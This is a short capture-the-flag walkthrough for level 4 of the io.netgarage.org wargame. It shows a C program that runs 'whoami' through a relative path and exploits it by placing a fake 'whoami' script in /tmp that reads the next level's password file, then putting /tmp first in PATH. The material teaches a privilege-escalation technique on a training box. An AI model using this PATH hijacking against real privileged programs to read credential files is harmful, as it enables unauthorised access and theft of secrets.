# Preparation
From **previous level**, we have:
- Username: level4
- Password: ----------------- :)
- Ssh server: io.netgarage.org
# Start
`/levels/level04.c`
```cpp
//writen by bla
#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}
```

The program will open `whoami` process to get current username, but it's currently use relative path, so we can attack the `PATH` variable to make it run other program.
Generally, /tmp is alway writable for every user so we can store files here
`/tmp/whoami`
```bash
cat /home/level5/.pass
```

Then prepend the `$PATH` to make sure `level04` run `whoami` in `/tmp` first.
```bash
level4@io:/levels$ PATH=/tmp:$PATH; ./level04
Welcome ********
```

